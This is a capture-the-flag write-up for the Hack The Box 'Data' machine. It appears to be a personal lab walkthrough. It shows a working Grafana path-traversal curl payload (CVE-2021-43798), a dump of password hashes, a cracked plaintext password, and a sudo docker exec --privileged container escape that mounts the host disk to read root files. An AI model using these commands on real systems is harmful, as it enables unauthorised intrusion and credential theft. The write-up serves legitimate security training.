---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Linux
  - Grafana
  - Docker
---
Overview

| Name        | Easy      |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV 10.129.234.47 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-27 01:26 CST
Nmap scan report for 10.129.234.47
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 27 Dec 2025 07:26:46 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 27 Dec 2025 07:26:52 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=12/27%Time=694F8A31%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Co
SF:ntrol:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nE
SF:xpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cook
SF:ie:\x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Pro
SF:tection:\x201;\x20mode=block\r\nDate:\x20Sat,\x2027\x20Dec\x202025\x200
SF:7:26:46\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Fo
SF:und</a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\
SF:nCache-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\
SF:nPragma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20H
SF:ttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Fra
SF:me-Options:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x
SF:20Sat,\x2027\x20Dec\x202025\x2007:26:52\x20GMT\r\nContent-Length:\x200\
SF:r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20cha
SF:rset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLS
SF:SessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration and Initial Foothold
## CVE-2021–43798

The Grafana instance is running version 8.0.0, so we’ll check for any known vulnerabilities tied to this release.

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-n8zdwnozfw]─[~]
└──╼ [★]$ curl -o grafana.db --path-as-is http://10.129.234.47:3000/public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  584k  100  584k    0     0   254k      0  0:00:02  0:00:02 --:--:--  254k
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-n8zdwnozfw]─[~]
└──╼ [★]$ sqlite3 grafana.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              org                       
alert_notification          org_user                  
alert_notification_state    playlist                  
alert_rule                  playlist_item             
alert_rule_tag              plugin_setting            
alert_rule_version          preferences               
annotation                  quota                     
annotation_tag              server_lock               
api_key                     session                   
cache_data                  short_url                 
dashboard                   star                      
dashboard_acl               tag                       
dashboard_provisioning      team                      
dashboard_snapshot          team_member               
dashboard_tag               temp_user                 
dashboard_version           test_data                 
data_source                 user                      
library_element             user_auth                 
library_element_connection  user_auth_token           
sqlite> SELECT * FROM user;
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0
```

[Grafana2Hashcat](https://github.com/iamaldi/grafana2hashcat).

```
7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
```

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-n8zdwnozfw]─[~/grafana2hashcat]
└──╼ [★]$ python3 grafana2hashcat.py hash.txt -o hashcat_hashes.txt

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  hash.txt
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[+] Writing output to 'hashcat_hashes.txt' file.
[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
```

We get cracked password `Boris:beautiful1`.

Login to SSH.
# Privilege Escalation
## Docker

```bash
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
boris@data:~$ sudo /snap/bin/docker exec -h
Flag shorthand -h has been deprecated, please use --help

Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]

Run a command in a running container

Options:
  -d, --detach               Detached mode: run command in the background
      --detach-keys string   Override the key sequence for detaching a container
  -e, --env list             Set environment variables
      --env-file list        Read in a file of environment variables
  -i, --interactive          Keep STDIN open even if not attached
      --privileged           Give extended privileges to the command
  -t, --tty                  Allocate a pseudo-TTY
  -u, --user string          Username or UID (format: <name|uid>[:<group|gid>])
  -w, --workdir string       Working directory inside the container
```

- We can use the `--privileged` flag to extend privleges to the command
- The `-it` flags can be used to enable `interactive mode` and allocate a `TTY` for the container session
- Lets find a dock instance to use this on

```bash
boris@data:~$ ps aux | grep docker
root       994  0.1  3.9 1496232 80924 ?       Ssl  07:16   0:03 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json
root      1213  0.1  2.1 1424788 43600 ?       Ssl  07:16   0:03 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
root      1527  0.0  0.1 1078724 3264 ?        Sl   07:16   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1533  0.0  0.1 1152712 3412 ?        Sl   07:16   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1551  0.0  0.4 712864  8580 ?        Sl   07:16   0:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
472       1570  0.0  3.0 775624 61084 ?        Ssl  07:16   0:01 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
boris     6710  0.0  0.0  14860  1120 pts/0    S+   07:45   0:00 grep --color=auto docker
```

```bash
boris@data:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bashbash-5.1# cat /root/root.txt
cat: can't open '/root/root.txt': No such file or directory
```

For Docker Escape check for the mount in the docker.

```bash
bash-5.1# cat /proc/mounts
overlay / overlay rw,relatime,lowerdir=/var/snap/docker/common/var-lib-docker/overlay2/l/2RMRALAZ4X3ETWWAFIO4URLCKU:/var/snap/docker/common/var-lib-docker/overlay2/l/C32RR2IYKIVOXMXZVRUH2EGVMU:/var/snap/docker/common/var-lib-docker/overlay2/l/CAVZGWG6DT37UBOHM6XHIUZUD5:/var/snap/docker/common/var-lib-docker/overlay2/l/3ATFAZLXUKTZ62T23IWWGNRXD2:/var/snap/docker/common/var-lib-docker/overlay2/l/42TJD6WDSINN56AZRW55R3ICO6:/var/snap/docker/common/var-lib-docker/overlay2/l/UTHFBRCC4KFYKXNBPIO52AZ7OQ:/var/snap/docker/common/var-lib-docker/overlay2/l/ZJJZSZR34MKC5KWMDRYIC4Q62C:/var/snap/docker/common/var-lib-docker/overlay2/l/EAWF5T66G6Z67H3LBO75E3NZCC:/var/snap/docker/common/var-lib-docker/overlay2/l/LMHE5BSBLFJITZ67RL5JIEM4SC,upperdir=/var/snap/docker/common/var-lib-docker/overlay2/90a0267386b75303aabacd2f202af4682d69d52a6d2e7e85ee93c3401e0938e3/diff,workdir=/var/snap/docker/common/var-lib-docker/overlay2/90a0267386b75303aabacd2f202af4682d69d52a6d2e7e85ee93c3401e0938e3/work,xino=off 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
cgroup /sys/fs/cgroup/systemd cgroup rw,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0
cgroup /sys/fs/cgroup/freezer cgroup rw,nosuid,nodev,noexec,relatime,freezer 0 0
cgroup /sys/fs/cgroup/devices cgroup rw,nosuid,nodev,noexec,relatime,devices 0 0
cgroup /sys/fs/cgroup/cpu,cpuacct cgroup rw,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
cgroup /sys/fs/cgroup/hugetlb cgroup rw,nosuid,nodev,noexec,relatime,hugetlb 0 0
cgroup /sys/fs/cgroup/rdma cgroup rw,nosuid,nodev,noexec,relatime,rdma 0 0
cgroup /sys/fs/cgroup/pids cgroup rw,nosuid,nodev,noexec,relatime,pids 0 0
cgroup /sys/fs/cgroup/perf_event cgroup rw,nosuid,nodev,noexec,relatime,perf_event 0 0
cgroup /sys/fs/cgroup/cpuset cgroup rw,nosuid,nodev,noexec,relatime,cpuset 0 0
cgroup /sys/fs/cgroup/blkio cgroup rw,nosuid,nodev,noexec,relatime,blkio 0 0
cgroup /sys/fs/cgroup/memory cgroup rw,nosuid,nodev,noexec,relatime,memory 0 0
cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
/dev/sda1 /etc/resolv.conf ext4 rw,relatime 0 0
/dev/sda1 /etc/hostname ext4 rw,relatime 0 0
/dev/sda1 /etc/hosts ext4 rw,relatime 0 0
```

- we find `/dev/sda1` is mounted to `/etc/hostname`, `/etc/hosts` and `/etc/resolve`
- This is likely coming from the localhost to give the docker container hostnames and IPs for DNS to resolve.
- Lets check mounts on the host system under `Boris`

```bash
boris@data:~$ cd /mnt
boris@data:/mnt$ ls
boris@data:/mnt$ df
Filesystem     1K-blocks    Used Available Use% Mounted on
udev             1001016       0   1001016   0% /dev
tmpfs             203120   10040    193080   5% /run
/dev/sda1        5008800 1905164   3034828  39% /
tmpfs            1015588       0   1015588   0% /dev/shm
tmpfs               5120       0      5120   0% /run/lock
tmpfs            1015588       0   1015588   0% /sys/fs/cgroup
/dev/loop0        119424  119424         0 100% /snap/docker/1125
/dev/loop1         56832   56832         0 100% /snap/core18/2253
/dev/loop2         43264   43264         0 100% /snap/snapd/14066
/dev/loop3         25600   25600         0 100% /snap/amazon-ssm-agent/4046
tmpfs             203116       0    203116   0% /run/user/1001
```

- `/dev/sda1` is mounted to the root directory `/` on the host machine
- We need to mount `/dev/sda1/` to our own mount

```bash
boris@data:/mnt$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash
bash-5.1# mkdir /mnt/bird
bash-5.1# mount /dev/sda1 /mnt/bird/
bash-5.1# cd /mnt/bird/
bash-5.1# ls
bin             home            lib64           opt             sbin            tmp             vmlinuz.old
boot            initrd.img      lost+found      proc            snap            usr
dev             initrd.img.old  media           root            srv             var
etc             lib             mnt             run             sys             vmlinuz
bash-5.1# cd root
bash-5.1# cat root.txt
e6af9c7c4436ec5cd755fa1b97d386ad
```

---
